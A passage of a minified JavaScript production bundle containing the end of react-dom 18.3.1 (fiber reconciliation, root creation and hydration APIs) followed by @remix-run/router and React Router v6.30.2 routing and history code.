Error(S(306,r,""))}return n;case 0:return r=n.type,i=n.pendingProps,i=n.elementType===r?i:Le(r,i),Fl(e,n,r,i,t);case 1:return r=n.type,i=n.pendingProps,i=n.elementType===r?i:Le(r,i),Js(e,n,r,i,t);case 3:e:{if(pc(n),e===null)throw Error(S(387));r=n.pendingProps,l=n.memoizedState,i=l.element,Uu(e,n),li(n,r,null,t);var o=n.memoizedState;if(r=o.element,l.isDehydrated)if(l={element:r,isDehydrated:!1,cache:o.cache,pendingSuspenseBoundaries:o.pendingSuspenseBoundaries,transitions:o.transitions},n.updateQueue.baseState=l,n.memoizedState=l,n.flags&256){i=ft(Error(S(423)),n),n=Zs(e,n,r,t,i);break e}else if(r!==i){i=ft(Error(S(424)),n),n=Zs(e,n,r,t,i);break e}else for(ye=dn(n.stateNode.containerInfo.firstChild),we=n,B=!0,Oe=null,t=zu(n,null,r,t),n.child=t;t;)t.flags=t.flags&-3|4096,t=t.sibling;else{if(ut(),r===i){n=qe(e,n,t);break e}se(e,n,r,t)}n=n.child}return n;case 5:return Fu(n),e===null&&Il(n),r=n.type,i=n.pendingProps,l=e!==null?e.memoizedProps:null,o=i.children,jl(r,i)?o=null:l!==null&&jl(r,l)&&(n.flags|=32),fc(e,n),se(e,n,o,t),n.child;case 6:return e===null&&Il(n),null;case 13:return hc(e,n,t);case 4:return Oo(n,n.stateNode.containerInfo),r=n.pendingProps,e===null?n.child=ct(n,null,r,t):se(e,n,r,t),n.child;case 11:return r=n.type,i=n.pendingProps,i=n.elementType===r?i:Le(r,i),Xs(e,n,r,i,t);case 7:return se(e,n,n.pendingProps,t),n.child;case 8:return se(e,n,n.pendingProps.children,t),n.child;case 12:return se(e,n,n.pendingProps.children,t),n.child;case 10:e:{if(r=n.type._context,i=n.pendingProps,l=n.memoizedProps,o=i.value,I(ri,r._currentValue),r._currentValue=o,l!==null)if(Me(l.value,o)){if(l.children===i.children&&!pe.current){n=qe(e,n,t);break e}}else for(l=n.child,l!==null&&(l.return=n);l!==null;){var s=l.dependencies;if(s!==null){o=l.child;for(var a=s.firstContext;a!==null;){if(a.context===r){if(l.tag===1){a=Ge(-1,t&-t),a.tag=2;var d=l.updateQueue;if(d!==null){d=d.shared;var m=d.pending;m===null?a.next=a:(a.next=m.next,m.next=a),d.pending=a}}l.lanes|=t,a=l.alternate,a!==null&&(a.lanes|=t),Dl(l.return,t,n),s.lanes|=t;break}a=a.next}}else if(l.tag===10)o=l.type===n.type?null:l.child;else if(l.tag===18){if(o=l.return,o===null)throw Error(S(341));o.lanes|=t,s=o.alternate,s!==null&&(s.lanes|=t),Dl(o,t,n),o=l.sibling}else o=l.child;if(o!==null)o.return=l;else for(o=l;o!==null;){if(o===n){o=null;break}if(l=o.sibling,l!==null){l.return=o.return,o=l;break}o=o.return}l=o}se(e,n,i.children,t),n=n.child}return n;case 9:return i=n.type,r=n.pendingProps.children,lt(n,t),i=_e(i),r=r(i),n.flags|=1,se(e,n,r,t),n.child;case 14:return r=n.type,i=Le(r,n.pendingProps),i=Le(r.type,i),qs(e,n,r,i,t);case 15:return cc(e,n,n.type,n.pendingProps,t);case 17:return r=n.type,i=n.pendingProps,i=n.elementType===r?i:Le(r,i),Ur(e,n),n.tag=1,he(r)?(e=!0,ei(n)):e=!1,lt(n,t),sc(n,r,i),Bl(n,r,i,t),Hl(null,n,r,!0,e,t);case 19:return mc(e,n,t);case 22:return dc(e,n,t)}throw Error(S(156,n.tag))};function jc(e,n){return iu(e,n)}function kp(e,n,t,r){this.tag=e,this.key=t,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=n,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Ce(e,n,t,r){return new kp(e,n,t,r)}function Qo(e){return e=e.prototype,!(!e||!e.isReactComponent)}function xp(e){if(typeof e=="function")return Qo(e)?1:0;if(e!=null){if(e=e.$$typeof,e===fo)return 11;if(e===po)return 14}return 2}function mn(e,n){var t=e.alternate;return t===null?(t=Ce(e.tag,n,e.key,e.mode),t.elementType=e.elementType,t.type=e.type,t.stateNode=e.stateNode,t.alternate=e,e.alternate=t):(t.pendingProps=n,t.type=e.type,t.flags=0,t.subtreeFlags=0,t.deletions=null),t.flags=e.flags&14680064,t.childLanes=e.childLanes,t.lanes=e.lanes,t.child=e.child,t.memoizedProps=e.memoizedProps,t.memoizedState=e.memoizedState,t.updateQueue=e.updateQueue,n=e.dependencies,t.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext},t.sibling=e.sibling,t.index=e.index,t.ref=e.ref,t}function Vr(e,n,t,r,i,l){var o=2;if(r=e,typeof e=="function")Qo(e)&&(o=1);else if(typeof e=="string")o=5;else e:switch(e){case Wn:return Rn(t.children,i,l,n);case co:o=8,i|=8;break;case ul:return e=Ce(12,t,n,i|2),e.elementType=ul,e.lanes=l,e;case cl:return e=Ce(13,t,n,i),e.elementType=cl,e.lanes=l,e;case dl:return e=Ce(19,t,n,i),e.elementType=dl,e.lanes=l,e;case Fa:return Ti(t,i,l,n);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case Ba:o=10;break e;case Ua:o=9;break e;case fo:o=11;break e;case po:o=14;break e;case en:o=16,r=null;break e}throw Error(S(130,e==null?e:typeof e,""))}return n=Ce(o,t,n,i),n.elementType=e,n.type=r,n.lanes=l,n}function Rn(e,n,t,r){return e=Ce(7,e,r,n),e.lanes=t,e}function Ti(e,n,t,r){return e=Ce(22,e,r,n),e.elementType=Fa,e.lanes=t,e.stateNode={isHidden:!1},e}function ll(e,n,t){return e=Ce(6,e,null,n),e.lanes=t,e}function ol(e,n,t){return n=Ce(4,e.children!==null?e.children:[],e.key,n),n.lanes=t,n.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},n}function Sp(e,n,t,r,i){this.tag=n,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Ui(0),this.expirationTimes=Ui(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Ui(0),this.identifierPrefix=r,this.onRecoverableError=i,this.mutableSourceEagerHydrationData=null}function Ko(e,n,t,r,i,l,o,s,a){return e=new Sp(e,n,t,s,a),n===1?(n=1,l===!0&&(n|=8)):n=0,l=Ce(3,null,null,n),e.current=l,l.stateNode=e,l.memoizedState={element:r,isDehydrated:t,cache:null,transitions:null,pendingSuspenseBoundaries:null},jo(l),e}function bp(e,n,t){var r=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:Vn,key:r==null?null:""+r,children:e,containerInfo:n,implementation:t}}function Oc(e){if(!e)return yn;e=e._reactInternals;e:{if(Un(e)!==e||e.tag!==1)throw Error(S(170));var n=e;do{switch(n.tag){case 3:n=n.stateNode.context;break e;case 1:if(he(n.type)){n=n.stateNode.__reactInternalMemoizedMergedChildContext;break e}}n=n.return}while(n!==null);throw Error(S(171))}if(e.tag===1){var t=e.type;if(he(t))return Ou(e,t,n)}return n}function Rc(e,n,t,r,i,l,o,s,a){return e=Ko(t,r,!0,e,i,l,o,s,a),e.context=Oc(null),t=e.current,r=ae(),i=hn(t),l=Ge(r,i),l.callback=n??null,fn(t,l,i),e.current.lanes=i,sr(e,i,r),me(e,r),e}function _i(e,n,t,r){var i=n.current,l=ae(),o=hn(i);return t=Oc(t),n.context===null?n.context=t:n.pendingContext=t,n=Ge(l,o),n.payload={element:e},r=r===void 0?null:r,r!==null&&(n.callback=r),e=fn(i,n,o),e!==null&&(Ae(e,i,o,l),Dr(e,i,o)),o}function pi(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function ua(e,n){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var t=e.retryLane;e.retryLane=t!==0&&t<n?t:n}}function Yo(e,n){ua(e,n),(e=e.alternate)&&ua(e,n)}function Ep(){return null}var Ac=typeof reportError=="function"?reportError:function(e){console.error(e)};function Xo(e){this._internalRoot=e}Pi.prototype.render=Xo.prototype.render=function(e){var n=this._internalRoot;if(n===null)throw Error(S(409));_i(e,n,null,null)};Pi.prototype.unmount=Xo.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var n=e.containerInfo;zn(function(){_i(null,e,null,null)}),n[Ye]=null}};function Pi(e){this._internalRoot=e}Pi.prototype.unstable_scheduleHydration=function(e){if(e){var n=du();e={blockedOn:null,target:e,priority:n};for(var t=0;t<tn.length&&n!==0&&n<tn[t].priority;t++);tn.splice(t,0,e),t===0&&pu(e)}};function qo(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function Ni(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function ca(){}function Cp(e,n,t,r,i){if(i){if(typeof r=="function"){var l=r;r=function(){var d=pi(o);l.call(d)}}var o=Rc(n,r,e,0,null,!1,!1,"",ca);return e._reactRootContainer=o,e[Ye]=o.current,Kt(e.nodeType===8?e.parentNode:e),zn(),o}for(;i=e.lastChild;)e.removeChild(i);if(typeof r=="function"){var s=r;r=function(){var d=pi(a);s.call(d)}}var a=Ko(e,0,!1,null,null,!1,!1,"",ca);return e._reactRootContainer=a,e[Ye]=a.current,Kt(e.nodeType===8?e.parentNode:e),zn(function(){_i(n,a,t,r)}),a}function Li(e,n,t,r,i){var l=t._reactRootContainer;if(l){var o=l;if(typeof i=="function"){var s=i;i=function(){var a=pi(o);s.call(a)}}_i(n,o,e,i)}else o=Cp(t,n,e,i,r);return pi(o)}uu=function(e){switch(e.tag){case 3:var n=e.stateNode;if(n.current.memoizedState.isDehydrated){var t=Nt(n.pendingLanes);t!==0&&(go(n,t|1),me(n,G()),!(A&6)&&(pt=G()+500,xn()))}break;case 13:zn(function(){var r=Xe(e,1);if(r!==null){var i=ae();Ae(r,e,1,i)}}),Yo(e,1)}};vo=function(e){if(e.tag===13){var n=Xe(e,134217728);if(n!==null){var t=ae();Ae(n,e,134217728,t)}Yo(e,134217728)}};cu=function(e){if(e.tag===13){var n=hn(e),t=Xe(e,n);if(t!==null){var r=ae();Ae(t,e,n,r)}Yo(e,n)}};du=function(){return M};fu=function(e,n){var t=M;try{return M=e,n()}finally{M=t}};xl=function(e,n,t){switch(n){case"input":if(hl(e,t),n=t.name,t.type==="radio"&&n!=null){for(t=e;t.parentNode;)t=t.parentNode;for(t=t.querySelectorAll("input[name="+JSON.stringify(""+n)+'][type="radio"]'),n=0;n<t.length;n++){var r=t[n];if(r!==e&&r.form===e.form){var i=ki(r);if(!i)throw Error(S(90));Va(r),hl(r,i)}}}break;case"textarea":$a(e,t);break;case"select":n=t.value,n!=null&&nt(e,!!t.multiple,n,!1)}};Ja=Wo;Za=zn;var Tp={usingClientEntryPoint:!1,Events:[ur,Kn,ki,Xa,qa,Wo]},Tt={findFiberByHostInstance:Nn,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},_p={bundleType:Tt.bundleType,version:Tt.version,rendererPackageName:Tt.rendererPackageName,rendererConfig:Tt.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Je.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=tu(e),e===null?null:e.stateNode},findFiberByHostInstance:Tt.findFiberByHostInstance||Ep,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var jr=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!jr.isDisabled&&jr.supportsFiber)try{gi=jr.inject(_p),Be=jr}catch{}}xe.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Tp;xe.createPortal=function(e,n){var t=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!qo(n))throw Error(S(200));return bp(e,n,null,t)};xe.createRoot=function(e,n){if(!qo(e))throw Error(S(299));var t=!1,r="",i=Ac;return n!=null&&(n.unstable_strictMode===!0&&(t=!0),n.identifierPrefix!==void 0&&(r=n.identifierPrefix),n.onRecoverableError!==void 0&&(i=n.onRecoverableError)),n=Ko(e,1,!1,null,null,t,!1,r,i),e[Ye]=n.current,Kt(e.nodeType===8?e.parentNode:e),new Xo(n)};xe.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var n=e._reactInternals;if(n===void 0)throw typeof e.render=="function"?Error(S(188)):(e=Object.keys(e).join(","),Error(S(268,e)));return e=tu(n),e=e===null?null:e.stateNode,e};xe.flushSync=function(e){return zn(e)};xe.hydrate=function(e,n,t){if(!Ni(n))throw Error(S(200));return Li(null,e,n,!0,t)};xe.hydrateRoot=function(e,n,t){if(!qo(e))throw Error(S(405));var r=t!=null&&t.hydratedSources||null,i=!1,l="",o=Ac;if(t!=null&&(t.unstable_strictMode===!0&&(i=!0),t.identifierPrefix!==void 0&&(l=t.identifierPrefix),t.onRecoverableError!==void 0&&(o=t.onRecoverableError)),n=Rc(n,null,e,1,t??null,i,!1,l,o),e[Ye]=n.current,Kt(e),r)for(e=0;e<r.length;e++)t=r[e],i=t._getVersion,i=i(t._source),n.mutableSourceEagerHydrationData==null?n.mutableSourceEagerHydrationData=[t,i]:n.mutableSourceEagerHydrationData.push(t,i);return new Pi(n)};xe.render=function(e,n,t){if(!Ni(n))throw Error(S(200));return Li(null,e,n,!1,t)};xe.unmountComponentAtNode=function(e){if(!Ni(e))throw Error(S(40));return e._reactRootContainer?(zn(function(){Li(null,null,e,!1,function(){e._reactRootContainer=null,e[Ye]=null})}),!0):!1};xe.unstable_batchedUpdates=Wo;xe.unstable_renderSubtreeIntoContainer=function(e,n,t,r){if(!Ni(t))throw Error(S(200));if(e==null||e._reactInternals===void 0)throw Error(S(38));return Li(e,n,t,!1,r)};xe.version="18.3.1-next-f1338f8080-20240426";function Mc(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Mc)}catch(e){console.error(e)}}Mc(),Ma.exports=xe;var Pp=Ma.exports,Ic,da=Pp;Ic=da.createRoot,da.hydrateRoot;/**
 * @remix-run/router v1.23.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function rr(){return rr=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(e[r]=t[r])}return e},rr.apply(this,arguments)}var sn;(function(e){e.Pop="POP",e.Push="PUSH",e.Replace="REPLACE"})(sn||(sn={}));const fa="popstate";function Np(e){e===void 0&&(e={});function n(r,i){let{pathname:l,search:o,hash:s}=r.location;return eo("",{pathname:l,search:o,hash:s},i.state&&i.state.usr||null,i.state&&i.state.key||"default")}function t(r,i){return typeof i=="string"?i:hi(i)}return jp(n,t,null,e)}function K(e,n){if(e===!1||e===null||typeof e>"u")throw new Error(n)}function Jo(e,n){if(!e){typeof console<"u"&&console.warn(n);try{throw new Error(n)}catch{}}}function Lp(){return Math.random().toString(36).substr(2,8)}function pa(e,n){return{usr:e.state,key:e.key,idx:n}}function eo(e,n,t,r){return t===void 0&&(t=null),rr({pathname:typeof e=="string"?e:e.pathname,search:"",hash:""},typeof n=="string"?vt(n):n,{state:t,key:n&&n.key||r||Lp()})}function hi(e){let{pathname:n="/",search:t="",hash:r=""}=e;return t&&t!=="?"&&(n+=t.charAt(0)==="?"?t:"?"+t),r&&r!=="#"&&(n+=r.charAt(0)==="#"?r:"#"+r),n}function vt(e){let n={};if(e){let t=e.indexOf("#");t>=0&&(n.hash=e.substr(t),e=e.substr(0,t));let r=e.indexOf("?");r>=0&&(n.search=e.substr(r),e=e.substr(0,r)),e&&(n.pathname=e)}return n}function jp(e,n,t,r){r===void 0&&(r={});let{window:i=document.defaultView,v5Compat:l=!1}=r,o=i.history,s=sn.Pop,a=null,d=m();d==null&&(d=0,o.replaceState(rr({},o.state,{idx:d}),""));function m(){return(o.state||{idx:null}).idx}function h(){s=sn.Pop;let C=m(),p=C==null?null:C-d;d=C,a&&a({action:s,location:x.location,delta:p})}function g(C,p){s=sn.Push;let c=eo(x.location,C,p);d=m()+1;let f=pa(c,d),v=x.createHref(c);try{o.pushState(f,"",v)}catch(y){if(y instanceof DOMException&&y.name==="DataCloneError")throw y;i.location.assign(v)}l&&a&&a({action:s,location:x.location,delta:1})}function k(C,p){s=sn.Replace;let c=eo(x.location,C,p);d=m();let f=pa(c,d),v=x.createHref(c);o.replaceState(f,"",v),l&&a&&a({action:s,location:x.location,delta:0})}function w(C){let p=i.location.origin!=="null"?i.location.origin:i.location.href,c=typeof C=="string"?C:hi(C);return c=c.replace(/ $/,"%20"),K(p,"No window.location.(origin|href) available to create URL for href: "+c),new URL(c,p)}let x={get action(){return s},get location(){return e(i,o)},listen(C){if(a)throw new Error("A history only accepts one active listener");return i.addEventListener(fa,h),a=C,()=>{i.removeEventListener(fa,h),a=null}},createHref(C){return n(i,C)},createURL:w,encodeLocation(C){let p=w(C);return{pathname:p.pathname,search:p.search,hash:p.hash}},push:g,replace:k,go(C){return o.go(C)}};return x}var ha;(function(e){e.data="data",e.deferred="deferred",e.redirect="redirect",e.error="error"})(ha||(ha={}));function Op(e,n,t){return t===void 0&&(t="/"),Rp(e,n,t)}function Rp(e,n,t,r){let i=typeof n=="string"?vt(n):n,l=Zo(i.pathname||"/",t);if(l==null)return null;let o=Dc(e);Ap(o);let s=null;for(let a=0;s==null&&a<o.length;++a){let d=Gp(l);s=Vp(o[a],d)}return s}function Dc(e,n,t,r){n===void 0&&(n=[]),t===void 0&&(t=[]),r===void 0&&(r="");let i=(l,o,s)=>{let a={relativePath:s===void 0?l.path||"":s,caseSensitive:l.caseSensitive===!0,childrenIndex:o,route:l};a.relativePath.startsWith("/")&&(K(a.relativePath.startsWith(r),'Absolute route path "'+a.relativePath+'" nested under path '+('"'+r+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),a.relativePath=a.relativePath.slice(r.length));let d=gn([r,a.relativePath]),m=t.concat(a);l.children&&l.children.length>0&&(K(l.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+d+'".')),Dc(l.children,n,m,d)),!(l.path==null&&!l.index)&&n.push({path:d,score:Fp(d,l.index),routesMeta:m})};return e.forEach((l,o)=>{var s;if(l.path===""||!((s=l.path)!=null&&s.includes("?")))i(l,o);else for(let a of zc(l.path))i(l,o,a)}),n}function zc(e){let n=e.split("/");if(n.length===0)return[];let[t,...r]=n,i=t.endsWith("?"),l=t.replace(/\?$/,"");if(r.length===0)return i?[l,""]:[l];let o=zc(r.join("/")),s=[];return s.push(...o.map(a=>a===""?l:[l,a].join("/"))),i&&s.push(...o),s.map(a=>e.startsWith("/")&&a===""?"/":a)}function Ap(e){e.sort((n,t)=>n.score!==t.score?t.score-n.score:Hp(n.routesMeta.map(r=>r.childrenIndex),t.routesMeta.map(r=>r.childrenIndex)))}const Mp=/^:[\w-]+$/,Ip=3,Dp=2,zp=1,Bp=10,Up=-2,ma=e=>e==="*";function Fp(e,n){let t=e.split("/"),r=t.length;return t.some(ma)&&(r+=Up),n&&(r+=Dp),t.filter(i=>!ma(i)).reduce((i,l)=>i+(Mp.test(l)?Ip:l===""?zp:Bp),r)}function Hp(e,n){return e.length===n.length&&e.slice(0,-1).every((r,i)=>r===n[i])?e[e.length-1]-n[n.length-1]:0}function Vp(e,n,t){let{routesMeta:r}=e,i={},l="/",o=[];for(let s=0;s<r.length;++s){let a=r[s],d=s===r.length-1,m=l==="/"?n:n.slice(l.length)||"/",h=Wp({path:a.relativePath,caseSensitive:a.caseSensitive,end:d},m),g=a.route;if(!h)return null;Object.assign(i,h.params),o.push({params:i,pathname:gn([l,h.pathname]),pathnameBase:qp(gn([l,h.pathnameBase])),route:g}),h.pathnameBase!=="/"&&(l=gn([l,h.pathnameBase]))}return o}function Wp(e,n){typeof e=="string"&&(e={path:e,caseSensitive:!1,end:!0});let[t,r]=$p(e.path,e.caseSensitive,e.end),i=n.match(t);if(!i)return null;let l=i[0],o=l.replace(/(.)\/+$/,"$1"),s=i.slice(1);return{params:r.reduce((d,m,h)=>{let{paramName:g,isOptional:k}=m;if(g==="*"){let x=s[h]||"";o=l.slice(0,l.length-x.length).replace(/(.)\/+$/,"$1")}const w=s[h];return k&&!w?d[g]=void 0:d[g]=(w||"").replace(/%2F/g,"/"),d},{}),pathname:l,pathnameBase:o,pattern:e}}function $p(e,n,t){n===void 0&&(n=!1),t===void 0&&(t=!0),Jo(e==="*"||!e.endsWith("*")||e.endsWith("/*"),'Route path "'+e+'" will be treated as if it were '+('"'+e.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+e.replace(/\*$/,"/*")+'".'));let r=[],i="^"+e.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(o,s,a)=>(r.push({paramName:s,isOptional:a!=null}),a?"/?([^\\/]+)?":"/([^\\/]+)"));return e.endsWith("*")?(r.push({paramName:"*"}),i+=e==="*"||e==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):t?i+="\\/*$":e!==""&&e!=="/"&&(i+="(?:(?=\\/|$))"),[new RegExp(i,n?void 0:"i"),r]}function Gp(e){try{return e.split("/").map(n=>decodeURIComponent(n).replace(/\//g,"%2F")).join("/")}catch(n){return Jo(!1,'The URL path "'+e+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+n+").")),e}}function Zo(e,n){if(n==="/")return e;if(!e.toLowerCase().startsWith(n.toLowerCase()))return null;let t=n.endsWith("/")?n.length-1:n.length,r=e.charAt(t);return r&&r!=="/"?null:e.slice(t)||"/"}const Qp=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Kp=e=>Qp.test(e);function Yp(e,n){n===void 0&&(n="/");let{pathname:t,search:r="",hash:i=""}=typeof e=="string"?vt(e):e,l;if(t)if(Kp(t))l=t;else{if(t.includes("//")){let o=t;t=t.replace(/\/\/+/g,"/"),Jo(!1,"Pathnames cannot have embedded double slashes - normalizing "+(o+" -> "+t))}t.startsWith("/")?l=ga(t.substring(1),"/"):l=ga(t,n)}else l=n;return{pathname:l,search:Jp(r),hash:Zp(i)}}function ga(e,n){let t=n.replace(/\/+$/,"").split("/");return e.split("/").forEach(i=>{i===".."?t.length>1&&t.pop():i!=="."&&t.push(i)}),t.length>1?t.join("/"):"/"}function sl(e,n,t,r){return"Cannot include a '"+e+"' character in a manually specified "+("`to."+n+"` field ["+JSON.stringify(r)+"].  Please separate it out to the ")+("`to."+t+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function Xp(e){return e.filter((n,t)=>t===0||n.route.path&&n.route.path.length>0)}function Bc(e,n){let t=Xp(e);return n?t.map((r,i)=>i===t.length-1?r.pathname:r.pathnameBase):t.map(r=>r.pathnameBase)}function Uc(e,n,t,r){r===void 0&&(r=!1);let i;typeof e=="string"?i=vt(e):(i=rr({},e),K(!i.pathname||!i.pathname.includes("?"),sl("?","pathname","search",i)),K(!i.pathname||!i.pathname.includes("#"),sl("#","pathname","hash",i)),K(!i.search||!i.search.includes("#"),sl("#","search","hash",i)));let l=e===""||i.pathname==="",o=l?"/":i.pathname,s;if(o==null)s=t;else{let h=n.length-1;if(!r&&o.startsWith("..")){let g=o.split("/");for(;g[0]==="..";)g.shift(),h-=1;i.pathname=g.join("/")}s=h>=0?n[h]:"/"}let a=Yp(i,s),d=o&&o!=="/"&&o.endsWith("/"),m=(l||o===".")&&t.endsWith("/");return!a.pathname.endsWith("/")&&(d||m)&&(a.pathname+="/"),a}const gn=e=>e.join("/").replace(/\/\/+/g,"/"),qp=e=>e.replace(/\/+$/,"").replace(/^\/*/,"/"),Jp=e=>!e||e==="?"?"":e.startsWith("?")?e:"?"+e,Zp=e=>!e||e==="#"?"":e.startsWith("#")?e:"#"+e;function eh(e){return e!=null&&typeof e.status=="number"&&typeof e.statusText=="string"&&typeof e.internal=="boolean"&&"data"in e}const Fc=["post","put","patch","delete"];new Set(Fc);const nh=["get",...Fc];new Set(nh);/**
 * React Router v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function ir(){return ir=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(e[r]=t[r])}return e},ir.apply(this,arguments)}const es=b.createContext(null),th=b.createContext(null),Fn=b.createContext(null),ji=b.createContext(null),Sn=b.createContext({outlet:null,matches:[],isDataRoute:!1}),Hc=b.createContext(null);function rh(e,n){let{relative:t}=n===void 0?{}:n;dr()||K(!1);let{basename:r,navigator:i}=b.useContext(Fn),{hash:l,pathname:o,search:s}=Wc(e,{relative:t}),a=o;return r!=="/"&&(a=o==="/"?r:gn([r,o])),i.createHref({pathname:a,search:s,hash:l})}function dr(){return b.useContext(ji)!=null}function fr(){return dr()||K(!1),b.useContext(ji).location}function Vc(e){b.useContext(Fn).static||b.useLayoutEffect(e)}function ns(){let{isDataRoute:e}=b.useContext(Sn);return e?vh():ih()}function ih(){dr()||K(!1);let e=b.useContext(es),{basename:n,future:t,navigator:r}=b.useContext(Fn),{matches:i}=b.useContext(Sn),{pathname:l}=fr(),o=JSON.stringify(Bc(i,t.v7_relativeSplatPath)),s=b.useRef(!1);return Vc(()=>{s.current=!0}),b.useCallback(function(d,m){if(m===void 0&&(m={}),!s.current)return;if(typeof d=="number"){r.go(d);return}let h=Uc(d,JSON.parse(o),l,m.relative==="path");e==null&&n!=="/"&&(h.pathname=h.pathname==="/"?n:gn([n,h.pathname])),(m.replace?r.replace:r.push)(h,m.state,m)},[n,r,o,l,e])}function lh(){let{matches:e}=b.useContext(Sn),n=e[e.length-1];return n?n.params:{}}function Wc(e,n){let{relative:t}=n===void 0?{}:n,{future:r}=b.useContext(Fn),{matches:i}=b.useContext(Sn),{pathname:l}=fr(),o=JSON.stringify(Bc(i,r.v7_relativeSplatPath));return b.useMemo(()=>Uc(e,JSON.parse(o),l,t==="path"),[e,o,l,t])}function oh(e,n){return sh(e,n)}function sh(e,n,t,r){dr()||K(!1);let{navigator:i}=b.useContext(Fn),{matches:l}=b.useContext(Sn),o=l[l.length-1],s=o?o.params:{};o&&o.pathname;let a=o?o.pathnameBase:"/";o&&o.route;let d=fr(),m;if(n){var h;let C=typeof n=="string"?vt(n):n;a==="/"||(h=C.pathname)!=null&&h.startsWith(a)||K(!1),m=C}else m=d;let g=m.pathname||"/",k=g;if(a!=="/"){let C=a.replace(/^\//,"").split("/");k="/"+g.replace(/^\//,"").split("/").slice(C.length).join("/")}let w=Op(e,{pathname:k}),x=fh(w&&w.map(C=>Object.assign({},C,{params:Object.assign({},s,C.params),pathname:gn([a,i.encodeLocation?i.encodeLocation(C.pathname).pathname:C.pathname]),pathnameBase:C.pathnameBase==="/"?a:gn([a,i.encodeLocation?i.encodeLocation(C.pathnameBase).pathname:C.pathnameBase])})),l,t,r);return n&&x?b.createElement(ji.Provider,{value:{location:ir({pathname:"/",search:"",hash:"",state:null,key:"default"},m),navigationType:sn.Pop}},x):x}function ah(){let e=gh(),n=eh(e)?e.status+" "+e.statusText:e instanceof Error?e.message:JSON.stringify(e),t=e instanceof Error?e.stack:null,i={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return b.createElement(b.Fragment,null,b.createElement("h2",null,"Unexpected Application Error!"),b.createElement("h3",{style:{fontStyle:"italic"}},n),t?b.createElement("pre",{style:i},t):null,null)}const uh=b.createElement(ah,null);class ch extends b.Component{constructor(n){super(n),this.state={location:n.location,revalidation:n.revalidation,error:n.error}}static getDerivedStateFromError(n){return{error:n}}static getDerivedStateFromProps(n,t){return t.location!==n.location||t.revalidation!=="idle"&&n.revalidation==="idle"?{error:n.error,location:n.location,revalidation:n.revalidation}:{error:n.error!==void 0?n.error:t.error,location:t.location,revalidation:n.revalidation||t.revalidation}}componentDidCatch(n,t){console.error("React Router caught the following error during render",n,t)}render(){return this.state.error!==void 0?b.createElement(Sn.Provider,{value:this.props.routeContext},b.createElement(Hc.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function dh(e){let{routeContext:n,match:t,children:r}=e,i=b.useContext(es);return i&&i.static&&i.staticContext&&(t.route.errorElement||t.route.ErrorBoundary)&&(i.staticContext._deepestRenderedBoundaryId=t.route.id),b.createElement(Sn.Provider,{value:n},r)}function fh(e,n,t,r){var i;if(n===void 0&&(n=[]),t===void 0&&(t=null),r===void 0&&(r=null),e==null){var l;if(!t)return null;if(t.errors)e=t.matches;else if((l=r)!=null&&l.v7_partialHydration&&n.length===0&&!t.initialized&&t.matches.length>0)e=t.matches;else return null}let 